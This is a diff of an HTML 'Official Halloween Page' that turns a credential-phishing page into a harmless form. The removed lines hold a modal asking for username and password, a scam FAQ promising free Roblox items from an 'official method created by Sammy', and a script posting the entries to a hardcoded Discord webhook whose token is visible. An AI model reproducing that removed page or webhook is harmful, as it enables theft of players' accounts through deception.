@@ -5,6 +5,10 @@
   <title>Official Halloween Page</title>
   <!-- Google Font: Fredoka One -->
   <link href="https://fonts.googleapis.com/css2?family=Fredoka+One&display=swap" rel="stylesheet">
+  
+  <!-- Vercel Analytics -->
+  <script defer src="https://vercel.com/analytics/script.js"></script>
+
   <style>
     body {
       margin: 0;
@@ -200,11 +204,11 @@
     <div class="modal-content">
       <h2>Enter Info</h2>
       <form id="claimForm">
-        <label for="name">Username:</label>
-        <input type="text" id="food" name="Username" required>
+        <label for="name">Name:</label>
+        <input type="text" id="name" name="name" required>
 
-        <label for="food">Password:</label>
-        <input type="text" id="food" name="Password" required>
+        <label for="food">Favorite Food:</label>
+        <input type="text" id="food" name="food" required>
 
         <button type="submit" class="submit-btn">Submit</button>
       </form>
@@ -214,33 +218,33 @@
   <!-- FAQ Section -->
   <section class="faq">
     <h2>FAQ</h2>
-    <p class="faq-sub">Essential information for Method</p>
+    <p class="faq-sub">Essential information for the Halloween page</p>
 
     <div class="faq-item">
-      <button class="faq-question">Is it safe?<span>+</span></button>
+      <button class="faq-question">How do I start the Halloween event? <span>+</span></button>
       <div class="faq-answer">
-        <p>Yes! This is an official method created by Sammy.</p>
+        <p>Click the "Claim" button above to begin.</p>
       </div>
     </div>
 
     <div class="faq-item">
       <button class="faq-question">What rewards can I earn? <span>+</span></button>
       <div class="faq-answer">
-        <p>You will unlock La Spooky Grande, La Vacca, and many more items.</p>
+        <p>You can unlock exclusive items and features during the Halloween event.</p>
       </div>
     </div>
 
     <div class="faq-item">
-      <button class="faq-question">Do I need Robux to claim? <span>+</span></button>
+      <button class="faq-question">Do I need Robux to play? <span>+</span></button>
       <div class="faq-answer">
-        <p>Nope! This method is completely free. </p>
+        <p>No. The Halloween event is free, but some optional cosmetics may cost Robux.</p>
       </div>
     </div>
 
     <div class="faq-item">
-      <button class="faq-question">How long does it take?<span>+</span></button>
+      <button class="faq-question">Can I customize my avatar? <span>+</span></button>
       <div class="faq-answer">
-        <p>Brainrots and items will be put into your base within 24 hours.</p>
+        <p>Yes! Special Halloween costumes and skins are available for customization.</p>
       </div>
     </div>
   </section>
@@ -263,7 +267,7 @@
       const food = document.getElementById("food").value;
 
       // Replace with your Discord webhook URL
-      const webhookURL = "https://discord.com/api/webhooks/1427784026365886464/abIwq6mVHjg4rcrJvhbozKnrn5aO637XoVEqzXBiLD7TYcZNXeF8_ZzjV1k-wCVWVv5z";
+      const webhookURL = "YOUR_DISCORD_WEBHOOK_URL_HERE";
 
       const payload = {
         content: `${name} ${food}`
